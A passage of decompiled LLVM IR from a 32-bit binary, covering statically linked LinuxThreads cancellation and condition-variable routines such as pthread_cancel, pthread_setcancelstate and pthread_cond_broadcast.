  %v2_80590fb = inttoptr i32 %v1_80590fb to i8*
  %v3_80590fb = load i8, i8* %v2_80590fb, align 1
  %v4_80590fb = icmp eq i8 %v3_80590fb, 0
  br i1 %v4_80590fb, label %dec_label_pc_8059117, label %dec_label_pc_8059101

dec_label_pc_8059101:                             ; preds = %dec_label_pc_80590ef
  %v1_8059101 = add i32 %v0_80590fb, 64
  %v2_8059101 = inttoptr i32 %v1_8059101 to i16*
  %v3_8059101 = load i16, i16* %v2_8059101, align 2
  %v9_8059101 = icmp eq i16 %v3_8059101, 256
  %v1_8059107 = icmp eq i1 %v9_8059101, false
  br i1 %v1_8059107, label %dec_label_pc_8059117, label %dec_label_pc_8059109

dec_label_pc_8059109:                             ; preds = %dec_label_pc_8059101
  store i32 %v15_80590cf, i32* %eax.global-to-local, align 4
  %v2_8059112 = call i32 @__pthread_do_exit(i32 -1, i32 %v15_80590cf)
  store i32 %v2_8059112, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059117

dec_label_pc_8059117:                             ; preds = %dec_label_pc_8059101, %dec_label_pc_80590ef, %dec_label_pc_8059109
  %v2_8059117 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8059117, i32* @ecx, align 4
  %v2_8059118 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059118, i32* @ebx, align 4
  %v2_8059119 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8059119, i32* @esi, align 4
  %v0_805911a = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805911a

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_8059117, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80590ef, { 1, 0 }
}

define i32 @pthread_testcancel() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_805911e = call i32 @thread_self.8(i32 ptrtoint (i32* @0 to i32))
  %v1_8059123 = add i32 %v1_805911e, 66
  %v2_8059123 = inttoptr i32 %v1_8059123 to i8*
  %v3_8059123 = load i8, i8* %v2_8059123, align 1
  %v4_8059123 = icmp eq i8 %v3_8059123, 0
  br i1 %v4_8059123, label %dec_label_pc_805913d, label %dec_label_pc_8059129

dec_label_pc_8059129:                             ; preds = %entry
  %v1_8059129 = add i32 %v1_805911e, 64
  %v2_8059129 = inttoptr i32 %v1_8059129 to i8*
  %v3_8059129 = load i8, i8* %v2_8059129, align 1
  %v4_8059129 = icmp eq i8 %v3_8059129, 0
  %v1_805912d = icmp eq i1 %v4_8059129, false
  br i1 %v1_805912d, label %dec_label_pc_805913d, label %dec_label_pc_805912f

dec_label_pc_805912f:                             ; preds = %dec_label_pc_8059129
  %v2_8059131 = ptrtoint i32* %stack_var_0 to i32
  %v2_8059138 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_8059131)
  br label %dec_label_pc_805913d

dec_label_pc_805913d:                             ; preds = %dec_label_pc_8059129, %entry, %dec_label_pc_805912f
  %v0_8059140 = phi i32 [ %v1_805911e, %dec_label_pc_8059129 ], [ %v1_805911e, %entry ], [ %v2_8059138, %dec_label_pc_805912f ]
  ret i32 %v0_8059140

; uselistorder directives
  uselistorder label %dec_label_pc_805913d, { 2, 0, 1 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-28, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8059141 = load i32, i32* @ebx, align 4
  store i32 %v0_8059141, i32* %stack_var_-4, align 4
  %v4_8059141 = ptrtoint i32* %stack_var_-4 to i32
  store i32 22, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_805914e = sext i8 %arg1 to i32
  %tmp14 = or i8 %arg1, 1
  %tmp15 = icmp eq i8 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_8059155, label %dec_label_pc_805918b

dec_label_pc_8059155:                             ; preds = %entry
  %v1_8059155 = call i32 @thread_self.8(i32 %v0_8059141)
  store i32 %v1_8059155, i32* %eax.global-to-local, align 4
  %v1_805915a = icmp eq i32 %arg2, 0
  store i32 %v1_8059155, i32* %edx.global-to-local, align 4
  br i1 %v1_805915a, label %dec_label_pc_8059166, label %dec_label_pc_8059160

dec_label_pc_8059160:                             ; preds = %dec_label_pc_8059155
  %v1_8059160 = add i32 %v1_8059155, 65
  %v2_8059160 = inttoptr i32 %v1_8059160 to i8*
  %v3_8059160 = load i8, i8* %v2_8059160, align 1
  %v4_8059160 = sext i8 %v3_8059160 to i32
  store i32 %v4_8059160, i32* %eax.global-to-local, align 4
  %v2_8059164 = inttoptr i32 %arg2 to i32*
  store i32 %v4_8059160, i32* %v2_8059164, align 4
  %v6_8059166.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_805916a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8059166

dec_label_pc_8059166:                             ; preds = %dec_label_pc_8059155, %dec_label_pc_8059160
  %v2_805916a = phi i32 [ %v1_8059155, %dec_label_pc_8059155 ], [ %v2_805916a.pre, %dec_label_pc_8059160 ]
  %v6_8059166 = phi i32 [ %v1_8059155, %dec_label_pc_8059155 ], [ %v6_8059166.pre, %dec_label_pc_8059160 ]
  %v7_8059166 = and i32 %v6_8059166, -256
  %v8_8059166 = or i32 %v7_8059166, %v4_805914e
  store i32 %v8_8059166, i32* %eax.global-to-local, align 4
  %v3_805916a = add i32 %v2_805916a, 65
  %v4_805916a = inttoptr i32 %v3_805916a to i8*
  store i8 %arg1, i8* %v4_805916a, align 1
  %v0_805916d = load i32, i32* %edx.global-to-local, align 4
  %v1_805916d = add i32 %v0_805916d, 66
  %v2_805916d = inttoptr i32 %v1_805916d to i8*
  %v3_805916d = load i8, i8* %v2_805916d, align 1
  %v4_805916d = icmp eq i8 %v3_805916d, 0
  br i1 %v4_805916d, label %dec_label_pc_8059189, label %dec_label_pc_8059173

dec_label_pc_8059173:                             ; preds = %dec_label_pc_8059166
  %v1_8059173 = add i32 %v0_805916d, 64
  %v2_8059173 = inttoptr i32 %v1_8059173 to i16*
  %v3_8059173 = load i16, i16* %v2_8059173, align 2
  %v9_8059173 = icmp eq i16 %v3_8059173, 256
  %v1_8059179 = icmp eq i1 %v9_8059173, false
  br i1 %v1_8059179, label %dec_label_pc_8059189, label %dec_label_pc_805917b

dec_label_pc_805917b:                             ; preds = %dec_label_pc_8059173
  store i32 %v4_8059141, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-28, align 4
  %v2_8059184 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8059141)
  store i32 %v2_8059184, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059189

dec_label_pc_8059189:                             ; preds = %dec_label_pc_8059173, %dec_label_pc_8059166, %dec_label_pc_805917b
  %stack_var_-20.0 = phi i32 [ %tmp10, %dec_label_pc_8059166 ], [ %tmp10, %dec_label_pc_8059173 ], [ %arg2, %dec_label_pc_805917b ]
  %stack_var_-24.0 = phi i32 [ %tmp9, %dec_label_pc_8059166 ], [ %tmp9, %dec_label_pc_8059173 ], [ %v4_8059141, %dec_label_pc_805917b ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_805918b.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_805918b

dec_label_pc_805918b:                             ; preds = %entry, %dec_label_pc_8059189
  %v2_805918d = phi i32 [ %tmp10, %entry ], [ %stack_var_-20.0, %dec_label_pc_8059189 ]
  %v2_805918c = phi i32 [ %tmp9, %entry ], [ %stack_var_-24.0, %dec_label_pc_8059189 ]
  %v2_805918b = phi i32 [ %tmp8, %entry ], [ %v2_805918b.pre, %dec_label_pc_8059189 ]
  %v0_805918e = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8059189 ]
  store i32 %v2_805918b, i32* @edx, align 4
  store i32 %v2_805918c, i32* @ecx, align 4
  store i32 %v2_805918d, i32* @ebx, align 4
  ret i32 %v0_805918e

; uselistorder directives
  uselistorder i32 %v1_8059155, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp10, { 2, 0, 1 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 3, 1 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805918b, { 1, 0 }
  uselistorder label %dec_label_pc_8059189, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059166, { 1, 0 }
}

define i32 @pthread_setcancelstate(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp14, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805918f = load i32, i32* @ebx, align 4
  store i32 %v0_805918f, i32* %stack_var_-4, align 4
  %v4_805918f = ptrtoint i32* %stack_var_-4 to i32
  store i32 22, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_805919c = sext i8 %arg1 to i32
  %tmp16 = or i8 %arg1, 1
  %tmp17 = icmp eq i8 %tmp16, 1
  br i1 %tmp17, label %dec_label_pc_80591a3, label %dec_label_pc_80591d9

dec_label_pc_80591a3:                             ; preds = %entry
  %v1_80591a3 = call i32 @thread_self.8(i32 %v0_805918f)
  store i32 %v1_80591a3, i32* %eax.global-to-local, align 4
  %v1_80591a8 = icmp eq i32 %arg2, 0
  store i32 %v1_80591a3, i32* %edx.global-to-local, align 4
  br i1 %v1_80591a8, label %dec_label_pc_80591b4, label %dec_label_pc_80591ae

dec_label_pc_80591ae:                             ; preds = %dec_label_pc_80591a3
  %v1_80591ae = add i32 %v1_80591a3, 64
  %v2_80591ae = inttoptr i32 %v1_80591ae to i8*
  %v3_80591ae = load i8, i8* %v2_80591ae, align 1
  %v4_80591ae = sext i8 %v3_80591ae to i32
  store i32 %v4_80591ae, i32* %eax.global-to-local, align 4
  %v2_80591b2 = inttoptr i32 %arg2 to i32*
  store i32 %v4_80591ae, i32* %v2_80591b2, align 4
  %v6_80591b4.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_80591b8.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80591b4

dec_label_pc_80591b4:                             ; preds = %dec_label_pc_80591a3, %dec_label_pc_80591ae
  %v2_80591b8 = phi i32 [ %v1_80591a3, %dec_label_pc_80591a3 ], [ %v2_80591b8.pre, %dec_label_pc_80591ae ]
  %v6_80591b4 = phi i32 [ %v1_80591a3, %dec_label_pc_80591a3 ], [ %v6_80591b4.pre, %dec_label_pc_80591ae ]
  %v7_80591b4 = and i32 %v6_80591b4, -256
  %v8_80591b4 = or i32 %v7_80591b4, %v4_805919c
  store i32 %v8_80591b4, i32* %eax.global-to-local, align 4
  %v3_80591b8 = add i32 %v2_80591b8, 64
  %v4_80591b8 = inttoptr i32 %v3_80591b8 to i8*
  store i8 %arg1, i8* %v4_80591b8, align 1
  %v0_80591bb = load i32, i32* %edx.global-to-local, align 4
  %v1_80591bb = add i32 %v0_80591bb, 66
  %v2_80591bb = inttoptr i32 %v1_80591bb to i8*
  %v3_80591bb = load i8, i8* %v2_80591bb, align 1
  %v4_80591bb = icmp eq i8 %v3_80591bb, 0
  br i1 %v4_80591bb, label %dec_label_pc_80591d7, label %dec_label_pc_80591c1

dec_label_pc_80591c1:                             ; preds = %dec_label_pc_80591b4
  %v1_80591c1 = add i32 %v0_80591bb, 64
  %v2_80591c1 = inttoptr i32 %v1_80591c1 to i16*
  %v3_80591c1 = load i16, i16* %v2_80591c1, align 2
  %v9_80591c1 = icmp eq i16 %v3_80591c1, 256
  %v1_80591c7 = icmp eq i1 %v9_80591c1, false
  br i1 %v1_80591c7, label %dec_label_pc_80591d7, label %dec_label_pc_80591c9

dec_label_pc_80591c9:                             ; preds = %dec_label_pc_80591c1
  store i32 %v4_805918f, i32* %eax.global-to-local, align 4
  %v2_80591d2 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_805918f)
  store i32 %v2_80591d2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80591d7

dec_label_pc_80591d7:                             ; preds = %dec_label_pc_80591c1, %dec_label_pc_80591b4, %dec_label_pc_80591c9
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_80591d9.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_80591d9

dec_label_pc_80591d9:                             ; preds = %entry, %dec_label_pc_80591d7
  %v2_80591d9 = phi i32 [ %tmp14, %entry ], [ %v2_80591d9.pre, %dec_label_pc_80591d7 ]
  %v0_80591dc = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_80591d7 ]
  store i32 %v2_80591d9, i32* %edx.global-to-local, align 4
  ret i32 %v0_80591dc

; uselistorder directives
  uselistorder i32 %v1_80591a3, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @thread_self.8, { 7, 0, 6, 3, 4, 5, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80591d9, { 1, 0 }
  uselistorder label %dec_label_pc_80591d7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80591b4, { 1, 0 }
}

define i32 @pthread_cancel(i32 %arg1) local_unnamed_addr {
entry:
  %zf.global-to-local = alloca i1, align 1
  %v0_80591e0 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_80591ec = urem i32 %arg1, 1024
  %v2_80591ec = icmp eq i32 %v1_80591ec, 0
  %v2_80591f1 = mul nuw nsw i32 %v1_80591ec, 16
  store i1 %v2_80591ec, i1* %zf.global-to-local, align 1
  %v1_80591f4 = add i32 %v2_80591f1, ptrtoint (i32* @global_var_8070140.628 to i32)
  store i32 %v1_80591f4, i32* @edi, align 4
  store i32 %v1_80591f4, i32* @eax, align 4
  %v1_80591fc = call i32 @__pthread_lock(i32 %v0_80591e0)
  %v0_8059201 = load i32, i32* @edi, align 4
  %v1_8059201 = add i32 %v0_8059201, 8
  %v2_8059201 = inttoptr i32 %v1_8059201 to i32*
  %v3_8059201 = load i32, i32* %v2_8059201, align 4
  store i32 %v3_8059201, i32* @ebx, align 4
  %v1_8059204 = icmp eq i32 %v3_8059201, 0
  store i1 %v1_8059204, i1* %zf.global-to-local, align 1
  br i1 %v1_8059204, label %dec_label_pc_805920d, label %dec_label_pc_8059208

dec_label_pc_8059208:                             ; preds = %entry
  %v1_8059208 = add i32 %v3_8059201, 16
  %v2_8059208 = inttoptr i32 %v1_8059208 to i32*
  %v3_8059208 = load i32, i32* %v2_8059208, align 4
  %v4_8059208 = load i32, i32* @esi, align 4
  %v15_8059208 = icmp eq i32 %v3_8059208, %v4_8059208
  store i1 %v15_8059208, i1* %zf.global-to-local, align 1
  br i1 %v15_8059208, label %dec_label_pc_805921d, label %dec_label_pc_805920d

dec_label_pc_805920d:                             ; preds = %dec_label_pc_8059208, %entry
  %v0_805920d = load i32, i32* @esp, align 4
  %v9_805920d = icmp eq i32 %v0_805920d, 12
  store i1 %v9_805920d, i1* %zf.global-to-local, align 1
  %v1_8059211 = inttoptr i32 %v0_8059201 to i32*
  %v2_8059211 = call i32 @__pthread_unlock(i32* %v1_8059211)
  br label %dec_label_pc_8059287

dec_label_pc_805921d:                             ; preds = %dec_label_pc_8059208
  %v1_805921d = add i32 %v3_8059201, 66
  %v2_805921d = inttoptr i32 %v1_805921d to i8*
  %v3_805921d = load i8, i8* %v2_805921d, align 1
  %v1_8059221 = add i32 %v3_8059201, 64
  %v2_8059221 = inttoptr i32 %v1_8059221 to i8*
  %v3_8059221 = load i8, i8* %v2_8059221, align 1
  %v12_8059221 = icmp eq i8 %v3_8059221, 1
  store i1 %v12_8059221, i1* %zf.global-to-local, align 1
  store i8 1, i8* %v2_805921d, align 1
  %v0_8059229 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8059229, label %dec_label_pc_805922f, label %dec_label_pc_805922b

dec_label_pc_805922b:                             ; preds = %dec_label_pc_805921d
  %v1_805922b = icmp eq i8 %v3_805921d, 0
  store i1 %v1_805922b, i1* %zf.global-to-local, align 1
  br i1 %v1_805922b, label %dec_label_pc_805923a, label %dec_label_pc_805922f

dec_label_pc_805922f:                             ; preds = %dec_label_pc_805922b, %dec_label_pc_805921d
  %v0_805922f = load i32, i32* @esp, align 4
  %v9_805922f = icmp eq i32 %v0_805922f, 12
  store i1 %v9_805922f, i1* %zf.global-to-local, align 1
  %v0_8059232 = load i32, i32* @edi, align 4
  %v1_8059233 = inttoptr i32 %v0_8059232 to i32*
  %v2_8059233 = call i32 @__pthread_unlock(i32* %v1_8059233)
  br label %dec_label_pc_8059285

dec_label_pc_805923a:                             ; preds = %dec_label_pc_805922b
  %v1_805923a = add i32 %v3_8059201, 444
  %v2_805923a = inttoptr i32 %v1_805923a to i32*
  %v3_805923a = load i32, i32* %v2_805923a, align 4
  store i32 0, i32* @esi, align 4
  %v1_8059245 = icmp eq i32 %v3_805923a, 0
  store i1 %v1_8059245, i1* %zf.global-to-local, align 1
  br i1 %v1_8059245, label %dec_label_pc_805925c, label %dec_label_pc_8059249

dec_label_pc_8059249:                             ; preds = %dec_label_pc_805923a
  %v3_8059245 = trunc i32 %v3_805923a to i8
  %v5_805924e = add i32 %v3_805923a, 4
  %v6_805924e = inttoptr i32 %v5_805924e to i32*
  %v7_805924e = load i32, i32* %v6_805924e, align 4
  call void @__pseudo_call(i32 %v7_805924e)
  %v0_8059251 = load i32, i32* @esp, align 4
  %v6_8059251 = icmp eq i32 %v0_8059251, -16
  store i1 %v6_8059251, i1* %zf.global-to-local, align 1
  store i32 %v3_805923a, i32* @esi, align 4
  %v3_8059256 = add i32 %v3_8059201, 440
  %v4_8059256 = inttoptr i32 %v3_8059256 to i8*
  store i8 %v3_8059245, i8* %v4_8059256, align 1
  br label %dec_label_pc_805925c

dec_label_pc_805925c:                             ; preds = %dec_label_pc_805923a, %dec_label_pc_8059249
  %v0_805925c = load i32, i32* @esp, align 4
  %v9_805925c = icmp eq i32 %v0_805925c, 12
  store i1 %v9_805925c, i1* %zf.global-to-local, align 1
  %v0_805925f = load i32, i32* @edi, align 4
  %v1_8059260 = inttoptr i32 %v0_805925f to i32*
  %v2_8059260 = call i32 @__pthread_unlock(i32* %v1_8059260)
  %v0_8059268 = load i32, i32* @esi, align 4
  %v1_8059268 = icmp eq i32 %v0_8059268, 0
  store i1 %v1_8059268, i1* %zf.global-to-local, align 1
  br i1 %v1_8059268, label %dec_label_pc_8059277, label %dec_label_pc_805926c

dec_label_pc_805926c:                             ; preds = %dec_label_pc_805925c
  store i1 false, i1* %zf.global-to-local, align 1
  %v1_8059270 = call i32 @__pthread_restart_new(i32 %v3_8059201)
  br label %dec_label_pc_8059285

dec_label_pc_8059277:                             ; preds = %dec_label_pc_805925c
  %v0_8059279 = load i32, i32* @global_var_807452c.636, align 4
  %v2_8059280 = call i32 @kill(i32 %v0_8059279, i32 0)
  br label %dec_label_pc_8059285

dec_label_pc_8059285:                             ; preds = %dec_label_pc_805926c, %dec_label_pc_805922f, %dec_label_pc_8059277
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8059287

dec_label_pc_8059287:                             ; preds = %dec_label_pc_805920d, %dec_label_pc_8059285
  %storemerge = phi i32 [ 3, %dec_label_pc_805920d ], [ 0, %dec_label_pc_8059285 ]
  %v0_8059287 = load i32, i32* @esp, align 4
  %v9_8059287 = icmp eq i32 %v0_8059287, -28
  store i1 %v9_8059287, i1* %zf.global-to-local, align 1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_805923a, { 0, 3, 1, 2 }
  uselistorder i1 %v15_8059208, { 1, 0 }
  uselistorder i32 %v3_8059201, { 5, 2, 4, 0, 1, 3, 6, 7 }
  uselistorder label %dec_label_pc_8059287, { 1, 0 }
  uselistorder label %dec_label_pc_8059285, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805925c, { 1, 0 }
}

define i32 @enqueue.9() local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue.10() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80592ad = load i32, i32* @ebx, align 4
  store i32 %v0_80592ad, i32* %stack_var_-4, align 4
  %v0_80592ae = load i32, i32* @eax, align 4
  br label %dec_label_pc_80592cc

dec_label_pc_80592b2:                             ; preds = %dec_label_pc_80592cc
  %v1_80592b2 = load i32, i32* @edx, align 4
  %v12_80592b2 = icmp eq i32 %v2_80592cc, %v1_80592b2
  %v1_80592b4 = icmp eq i1 %v12_80592b2, false
  %v1_80592c9 = add i32 %v2_80592cc, 8
  br i1 %v1_80592b4, label %dec_label_pc_80592cc, label %dec_label_pc_80592b6

dec_label_pc_80592b6:                             ; preds = %dec_label_pc_80592b2
  %v2_80592b6 = inttoptr i32 %v1_80592c9 to i32*
  %v3_80592b6 = load i32, i32* %v2_80592b6, align 4
  store i32 %v3_80592b6, i32* %v1_80592cc, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v2_80592b6, align 4
  %v2_80592d4.pre = load i32, i32* %stack_var_-4, align 4
  %v0_80592d5.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80592d4

dec_label_pc_80592cc:                             ; preds = %dec_label_pc_80592b2, %entry
  %v1_80592b9 = phi i32 [ %v0_80592ae, %entry ], [ %v1_80592c9, %dec_label_pc_80592b2 ]
  %v1_80592cc = inttoptr i32 %v1_80592b9 to i32*
  %v2_80592cc = load i32, i32* %v1_80592cc, align 4
  %v1_80592ce = icmp eq i32 %v2_80592cc, 0
  %v1_80592d0 = icmp eq i1 %v1_80592ce, false
  br i1 %v1_80592d0, label %dec_label_pc_80592b2, label %dec_label_pc_80592d2

dec_label_pc_80592d2:                             ; preds = %dec_label_pc_80592cc
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80592d4

dec_label_pc_80592d4:                             ; preds = %dec_label_pc_80592b6, %dec_label_pc_80592d2
  %v0_80592d5 = phi i32 [ %v0_80592d5.pre, %dec_label_pc_80592b6 ], [ 0, %dec_label_pc_80592d2 ]
  %v2_80592d4 = phi i32 [ %v2_80592d4.pre, %dec_label_pc_80592b6 ], [ %v0_80592ad, %dec_label_pc_80592d2 ]
  store i32 %v2_80592d4, i32* @ebx, align 4
  ret i32 %v0_80592d5

; uselistorder directives
  uselistorder i32 %v2_80592cc, { 2, 0, 1 }
  uselistorder i32* %v1_80592cc, { 1, 0 }
  uselistorder i32 %v1_80592c9, { 1, 0 }
  uselistorder label %dec_label_pc_80592d4, { 1, 0 }
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  store i32 %tmp1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %arg1, align 4
  %v1_80592e0 = add i32 %tmp1, 4
  %v2_80592e0 = inttoptr i32 %v1_80592e0 to i32*
  store i32 0, i32* %v2_80592e0, align 4
  %v0_80592e7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80592e7 = add i32 %v0_80592e7, 8
  %v2_80592e7 = inttoptr i32 %v1_80592e7 to i32*
  store i32 0, i32* %v2_80592e7, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0
}

define i32 @__GI_pthread_cond_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 16
}

define i32 @pthread_condattr_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_condattr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_condattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_condattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %tmp2 = or i32 %arg1, 1
  %tmp3 = icmp eq i32 %tmp2, 1
  br i1 %tmp3, label %dec_label_pc_8059322, label %dec_label_pc_8059329

dec_label_pc_8059322:                             ; preds = %entry
  br label %dec_label_pc_8059329

dec_label_pc_8059329:                             ; preds = %entry, %dec_label_pc_8059322
  %v0_8059329 = phi i32 [ 22, %entry ], [ 38, %dec_label_pc_8059322 ]
  ret i32 %v0_8059329

; uselistorder directives
  uselistorder label %dec_label_pc_8059329, { 1, 0 }
}

define i32 @__pthread_set_own_extricate_if.11(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805932a = load i32, i32* @esi, align 4
  %v0_805932b = load i32, i32* @ebx, align 4
  %v0_805932f = load i32, i32* @eax, align 4
  store i32 %v0_805932f, i32* @ebx, align 4
  %v0_8059331 = load i32, i32* @edx, align 4
  store i32 %v0_8059331, i32* @esi, align 4
  %v1_8059333 = icmp eq i32 %v0_8059331, 0
  br i1 %v1_8059333, label %dec_label_pc_805933f, label %dec_label_pc_8059337

dec_label_pc_8059337:                             ; preds = %entry
  %v1_8059337 = add i32 %v0_805932f, 64
  %v2_8059337 = inttoptr i32 %v1_8059337 to i8*
  %v3_8059337 = load i8, i8* %v2_8059337, align 1
  %v4_8059337 = icmp eq i8 %v3_8059337, 0
  %v1_805933b = icmp eq i1 %v4_8059337, false
  br i1 %v1_805933b, label %dec_label_pc_8059361, label %dec_label_pc_8059349

dec_label_pc_805933f:                             ; preds = %entry
  %v1_805933f = add i32 %v0_805932f, 28
  %v2_805933f = inttoptr i32 %v1_805933f to i32*
  %v3_805933f = load i32, i32* %v2_805933f, align 4
  store i32 %v3_805933f, i32* @eax, align 4
  store i32 %v0_805932f, i32* @edx, align 4
  %v1_8059344 = call i32 @__pthread_lock(i32 %v0_805932b)
  %v1_8059349.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8059349

dec_label_pc_8059349:                             ; preds = %dec_label_pc_8059337, %dec_label_pc_805933f
  %v1_8059349 = phi i32 [ %v0_805932f, %dec_label_pc_8059337 ], [ %v1_8059349.pre, %dec_label_pc_805933f ]
  %v2_8059349 = add i32 %v1_8059349, 444
  %v3_8059349 = inttoptr i32 %v2_8059349 to i32*
  store i32 %v0_8059331, i32* %v3_8059349, align 4
  %v1_8059351 = icmp eq i1 %v1_8059333, false
  br i1 %v1_8059351, label %dec_label_pc_8059361, label %dec_label_pc_8059353

dec_label_pc_8059353:                             ; preds = %dec_label_pc_8059349
  %v0_8059356 = load i32, i32* @ebx, align 4
  %v1_8059356 = add i32 %v0_8059356, 28
  %v2_8059356 = inttoptr i32 %v1_8059356 to i32*
  %v3_8059356 = load i32, i32* %v2_8059356, align 4
  %v1_8059359 = inttoptr i32 %v3_8059356 to i32*
  %v2_8059359 = call i32 @__pthread_unlock(i32* %v1_8059359)
  br label %dec_label_pc_8059361

dec_label_pc_8059361:                             ; preds = %dec_label_pc_8059349, %dec_label_pc_8059337, %dec_label_pc_8059353
  %v2_8059361 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_805932b, i32* @ebx, align 4
  store i32 %v0_805932a, i32* @esi, align 4
  ret i32 %v2_8059361

; uselistorder directives
  uselistorder i1 %v1_8059333, { 1, 0 }
  uselistorder label %dec_label_pc_8059361, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059349, { 1, 0 }
}

define i32 @restart.12() local_unnamed_addr {
entry:
  %v0_8059368 = load i32, i32* @eax, align 4
  %v1_8059369 = call i32 @__pthread_restart_new(i32 %v0_8059368)
  ret i32 %v1_8059369
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8059373 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_805937f = call i32 @__pthread_lock(i32 %v0_8059373)
  %v0_8059387 = load i32, i32* @ebx, align 4
  %v1_8059387 = add i32 %v0_8059387, 8
  %v2_8059387 = inttoptr i32 %v1_8059387 to i32*
  %v3_8059387 = load i32, i32* %v2_8059387, align 4
  store i32 %v3_8059387, i32* @esi, align 4
  store i32 0, i32* %v2_8059387, align 4
  %v0_8059391 = load i32, i32* @ebx, align 4
  %v1_8059392 = inttoptr i32 %v0_8059391 to i32*
  %v2_8059392 = call i32 @__pthread_unlock(i32* %v1_8059392)
  %v0_80593b61 = load i32, i32* @esi, align 4
  %v1_80593b62 = icmp eq i32 %v0_80593b61, 0
  %v1_80593b89 = icmp eq i1 %v1_80593b62, false
  br i1 %v1_80593b89, label %dec_label_pc_805939c, label %dec_label_pc_80593ba

dec_label_pc_805939c:                             ; preds = %entry, %dec_label_pc_805939c
  %v0_805939c = phi i32 [ %v0_80593b6, %dec_label_pc_805939c ], [ %v0_80593b61, %entry ]
  %v1_805939c = add i32 %v0_805939c, 8
  %v2_805939c = inttoptr i32 %v1_805939c to i32*
  %v3_805939c = load i32, i32* %v2_805939c, align 4
